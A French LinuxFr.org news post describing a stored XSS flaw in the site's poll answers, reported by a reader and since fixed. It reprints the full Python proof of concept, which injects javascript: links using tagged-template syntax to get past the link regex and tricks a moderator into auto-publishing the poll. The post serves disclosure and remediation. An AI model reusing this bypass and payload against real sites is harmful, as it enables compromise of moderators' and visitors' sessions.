+++
title = "XSS sur le site linuxfr.org (pas très grave à mon avis)"
description = "Ce titre est celui d’un courriel reçu le samedi 20 juin 2026 en fin de soirée. La France est alors au milieu de sa deuxième canicule de l’année, et moi en train de produire la dépêche [De la fermeture des comptes inacti"
date = "2026-07-02T21:05:58Z"
url = "https://linuxfr.org/news/xss-sur-le-site-linuxfr-org-pas-tres-grave-a-mon-avis"
author = "Benoît Sibaud"
text = ""
lastupdated = "2026-07-03T22:38:39.842225747Z"
seen = true
+++

Ce titre est celui d’un courriel reçu le samedi 20 juin 2026 en fin de soirée. La France est alors au milieu de sa [deuxième canicule](https://fr.wikipedia.org/wiki/Canicules_de_2026_en_Europe) de l’année, et moi en train de produire la dépêche [De la fermeture des comptes inactifs depuis 3 ans](//linuxfr.org/news/de-la-fermeture-des-comptes-inactifs-depuis-3-ans) que je pensais initialement en avance et qui était finalement en retard.

Et donc recevoir un tel message n’annonçait rien de bien rafraîchissant. (Même si ça changeait des week-ends successifs d’annonces de failles de sécurité noyau à déployer plus ou moins en urgence)

Pourtant il s’agissait du signalement d’une faille réelle, fait de façon détaillée, claire et pédagogique. Ça change du bruit de fond habituel sur Internet avec son lot de tentatives diverses et variées d’injections chimériques mi-SQL mi-Javascript mi-PHP, et ses fameux audits de sécurité non-sollicités et délicieusement bourrins. Grand merci donc à *0xMitsurugi H* pour avoir explicité le problème.

* lien nᵒ 1 : [(RMLL 2009) Retour d'expérience sécurité sur 11 ans de LinuxFr.org](https://linuxfr.org/redirect/117808)
* lien nᵒ 2 : [Les sondages sur LinuxFr.org](https://linuxfr.org/redirect/117809)

Sommaire
----------

* [Le signalement](#toc-le-signalement)
  * [L’explication](#toc-lexplication)
  * [Et paf le PoC !](#toc-et-paf-le-poc)

* [Un peu de contexte](#toc-un-peu-de-contexte)
* [Une vraie faille](#toc-une-vraie-faille)
* [Conclusion](#toc-conclusion)

Le signalement
----------

### L’explication ###

(avec l’autorisation de l’auteur « mon code et le rapport sont open source »)

```
Bonjour,

J’ai lu le code source de linuxfr.org et je me suis intéressé aux sondages.
J’ai l’impression que certains échappements HTML ne fonctionnent pas très bien.

Il est possible de bypasser la regexp dans les réponses du sondage et
injecter du javascript dans les réponses.

En soi, ce ne serait pas grave, car un sondage doit être validé par un admin
pour que les utilisateurs le voient.

L’astuce ici consiste à utiliser une réponse avec du js qui fera valider
automatiquement le sondage par un admin, et mettre un second javascript
dans une autre réponse destiné aux utilisateurs, une fois le sondage
validé, permettant la compromission de tous les utilisateurs qui vont
cliquer sur le sondage.

Voici le poc en python (inliné dans le mail car google fait des dingueries
avec les pièces jointes en python):

```

```
#!/usr/bin/env python3
r"""
PoC — XSS stockee via linkify dans les reponses de sondage linuxfr.org

Vecteur : href="javascript:..." active au clic
Bypass regex : tagged template ` func`arg` ` au lieu de func('arg')
  - document.querySelector`.ok_button`  au lieu de
document.querySelector('.ok_button')
  - form.submit``                      au lieu de form.submit()
  - alert`msg`                         au lieu de alert('msg')
  Aucune parenthese `)` n'apparait dans l'URL markdown, donc la regex
  \[([^\]]*)\]\(([^)]*)\) ne peut rien manger.

Contrainte : 128 caracteres max (PollAnswer)
  Phase 1 : 64 car. (form.submit pour auto-publication)
  Phase 2 : 54 car. (alert de preuve)

Deroulement :
  1. Attaquant cree un sondage avec les payloads XSS
  2. Moderateuur visite /moderation/sondages/ID et clique sur [a]
  3. La publication se fait sans boite de confirmation
  4. Les visiteurs cliquent sur [b] -> alerte JavaScript

Usage :
  python3 poc.py <url> <user_session>

  <url>            : racine du site (ex: http://dlfp.lo)
  <user_session>   : valeur du cookie linuxfr.org_session (compte standard)

Exemple :
  python3 poc.py http://dlfp.lo "user_session_value"

Prerequis :
  pip install requests
"""

import re
import sys
from urllib.parse import urljoin, urlparse

import requests

def e(msg: str, code: int = 1) -> None:
    print(f"[-] {msg}")
    sys.exit(code)

def s(msg: str) -> None:
    print(f"[+] {msg}")

def info(msg: str) -> None:
    print(f"[*] {msg}")

def banner() -> None:
    print("=" * 68)
    print("  PoC — XSS linkify -> Auto-validation + XSS proof")
    print("  Vecteur : tagged templates dans href (pas de ) necessaire)")
    print("  Cible : linuxfr.org")
    print("=" * 68)

def make_session(cookie_value: str, target_url: str) -> requests.Session:
    s = requests.Session()
    hostname = urlparse(target_url).hostname
    s.cookies.set("linuxfr.org_session", cookie_value, domain=hostname)
    return s

def create_poll(url: str, session: requests.Session,) -> tuple[str, str]:
    """
    Cree un sondage avec les reponses malveillantes.
    """

    # Réponse 1 : 64 car. — form.submit() via tagged template
    # document.querySelector`.ok_button`   => querySelector('.ok_button')
    # form.submit``                        => form.submit()
    payload_phase1 = (
        "[a]"
        "(javascript:document.querySelector"
        "`.ok_button`.form.submit``)"
    )

    # Réponse 2 : 54 car. — alert via tagged template
    payload_phase2 = (
        "[b]"
        "(javascript:alert"
        "`smile this is your favorite XSS`)"
    )

    info("Chargement du formulaire de creation...")
    r = session.get(urljoin(url, "/sondages/nouveau"))
    csrf = re.search(
        r'name="authenticity_token" value="([^"]*)"', r.text
    )
    csrf = csrf.group(1)

    info("Creation du sondage malveillant...")
    r = session.post(urljoin(url, "/sondages"), data={
        "authenticity_token": csrf,
        "poll[title]": "PoC XSS — tagged template",
        "poll[wiki_explanations]": (
            "Cliquez sur les liens ci-dessous !"
        ),
        "poll[cc_licensed]": "1",
        "poll[answers_attributes][0][answer]": payload_phase1,
        "poll[answers_attributes][1][answer]": payload_phase2,
    })

    if r.status_code not in (200, 302):
        e(f"Creation echouee (HTTP {r.status_code})")

    print("Connectez vous en tant qu'admin et cliquez sur la réponse A")

def main():
    banner()

    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <url> <user_session>")
        print()
        print("Exemple :")
        print(f'  {sys.argv[0]} http://dlfp.lo "SESSION_USER"')
        sys.exit(1)

    target_url = sys.argv[1].rstrip("/")
    user_session_val = sys.argv[2]

    user_session = make_session(user_session_val, target_url)

    # Creation du sondage malveillant
    print()
    info("Creation du sondage avec payloads XSS")
    create_poll(target_url, user_session)

if __name__ == "__main__":
    main()
```

```
Et je joins les copies d’écran dans l’ordre :-)

C’était sympa à trigger, je ne pensais pas arriver à quelque chose avec
l’autovalidation de l’admin pour publier le sondage. Bon, il faut quand
même l’interaction d’un admin (d’où le fait que ce n’est pas très grave),
j’ai essayé des trucs à base de onmouseover, mais je n’arrive à rien de
bien ce soir, il fait trop chaud.

Merci de gérer et maintenir le site linuxfr, j’ai appris beaucoup de choses
en le lisant, même si je ne suis qu’un simple lecteur :-)
Merci de fournir le code source sur github, ça m’a permis de debug en live
mes tests.

Bonne soirée

```

### Et paf le PoC ! ###

Les cinq images étaient en pièces jointes du signalement.

La démonstration à l’œuvre :

![La démonstration à l’œuvre](https://img.linuxfr.org/img/68747470733a2f2f7069632e696e66696e692e66722f4445364e346b704d2f4c7a7a65695a634d2e706e67/LzzeiZcM.png "Source : https://pic.infini.fr/DE6N4kpM/LzzeiZcM.png")

En *admin*, le nouveau sondage dans la page des sondages :

![Le nouveau sondage dans la page des sondages](https://img.linuxfr.org/img/68747470733a2f2f7069632e696e66696e692e66722f34506737545851622f49786e386f4b53782e706e67/Ixn8oKSx.png "Source : https://pic.infini.fr/4Pg7TXQb/Ixn8oKSx.png")

En *admin*, cliquer sur un choix autovalide le sondage :

![Cliquer sur un choix permet autovalide le sondage](https://img.linuxfr.org/img/68747470733a2f2f7069632e696e66696e692e66722f434c314a566f67682f6b334170314345622e706e67/k3Ap1CEb.png "Source : https://pic.infini.fr/CL1JVogh/k3Ap1CEb.png")

Et sur le sondage publié, un clic d’un compte utilisateur :

![Et sur le sondage publié, un clic](https://img.linuxfr.org/img/68747470733a2f2f7069632e696e66696e692e66722f466a424d474a746a2f3377714f6b6e70712e706e67/3wqOknpq.png "Source : https://pic.infini.fr/FjBMGJtj/3wqOknpq.png")

Paf la faille :

![Paf la faille](https://img.linuxfr.org/img/68747470733a2f2f7069632e696e66696e692e66722f52704242624365532f5435506b45494b6f2e706e67/T5PkEIKo.png "Source : https://pic.infini.fr/RpBBbCeS/T5PkEIKo.png")

Un peu de contexte
----------

La faille signalée concerne le type de contenu [sondages](//linuxfr.org/sondages) du site LinuxFr.org : *un sondage est une question sur un thème donné ; le lectorat du site LinuxFr.org peut choisir parmi un ensemble de réponses proposées.* ([aide](//linuxfr.org/aide#aide-sondage))

Une personne ayant un compte sur le site peut proposer un sondage ([aide](//linuxfr.org/aide#aide-authentification)). Sa publication nécessite une approbation par l’équipe de modération ([aide](//linuxfr.org/aide#aide-moderation)).

Un sondage est composé d’une partie question en Markdown. Et de (en général) plusieurs réponses dans un format exotique : c’est du texte brut, pas de mises en forme en italique/gras ou autre, sauf que les liens au format Markdown `[oh un lien](https://une.adresse.invalid)` sont possibles, [depuis 2012](https://github.com/linuxfrorg/linuxfr.org/commit/54a24d061004466ff66b23a17bb912e1fc3bdfff). Ce code pour gérer du supposé texte brut mais acceptant des hyperliens Markdown, avec une expression rationnelle pour gérer, forcément ça annonçait un hypothétique problème à venir.

« Le *cross-site scripting* (abrégé XSS) est un type de faille de sécurité des sites web permettant d'injecter du contenu dans une page, provoquant ainsi des actions sur les navigateurs web visitant la page. » ([Wikipedia](https://fr.wikipedia.org/wiki/Cross-site_scripting)) : ici on va glisser un sondage malveillant dans la base de données LinuxFr.org, une personne modératrice va aller le lire et déclencher involontairement la publication, qui devient alors visible par tout le monde, et chaque personne qui ira voter sur le sondage va déclencher un comportement non désiré. Bon en pratique, à ce moment là, ladite personne modératrice se rendrait alors compte du problème et dépublierait le sondage en catastrophe. Potentiellement trop tard pour quelques personnes du lectorat avides de sondages.

Une vraie faille
----------

Bon si ça se trouve, la faille ne fonctionne pas, c’est facile de tester et de voir si on reproduit. Bon on reproduit…

En analysant le code et en testant, on voit qu’il y a plusieurs soucis :

* on peut insérer en base de données des choses que l’on ne voudrait pas y voir ;
* on peut afficher ce qu’on a trouvé en base en filtrant mal.

Donc on va ajouter un filtrage à la création sur les hyperliens pour ne laisser pas que les protocoles autorisés et que des adresses qui ressemblent à des adresses.

Et on va ajouter un filtrage à l’affichage / conversion en HTML pour n’afficher que des hyperliens, dans les protocoles autorisés et avec une adresse qui ressemble à une adresse.

Évidemment il y a la contrainte de ne pas casser le fonctionnel et les sondages déjà présents en base de données.

Donc on fait plein de tests un peu cracra :

![tests un peu cracra](https://img.linuxfr.org/img/68747470733a2f2f7069632e696e66696e692e66722f644c38664a6f734d2f54384e4d35586c492e706e67/T8NM5XlI.png "Source : https://pic.infini.fr/dL8fJosM/T8NM5XlI.png")

Et on produit un [commit de correction](https://github.com/linuxfrorg/linuxfr.org/commit/6091d4d6c85ea5113f02ebd48d16ae957f2e3cb6) (si tout va bien).

On a aussi vérifié le contenu existant de la base, au cas où.

Il ne restait plus qu’à remercier le contributeur et à convenir d’une publication en dépêche. Que voici.

Conclusion
----------

Une contribution par une personne qui a lu le code source, qui a déployé le site, qui a écrit un bout de code pour illustrer l’exploitation de la faille de bout-en-bout, qui a littéralement illustré l’exploitation avec cinq images et qui a accompagné le tout d’une explication détaillée et en fournissant le code. Que demander de plus ? Encore merci.

Ah oui il faut une ouverture finale et tenir en haleine le lectorat : cette dépêche n'évoque pas la dernière faille signalée (ni même l'avant-dernière), et on n'est que douze jours après.

[Télécharger ce contenu au format EPUB](https://linuxfr.org/news/xss-sur-le-site-linuxfr-org-pas-tres-grave-a-mon-avis.epub)

**Commentaires :** [voir le flux Atom](https://linuxfr.org/nodes/144523/comments.atom) [ouvrir dans le navigateur](https://linuxfr.org/news/xss-sur-le-site-linuxfr-org-pas-tres-grave-a-mon-avis#comments)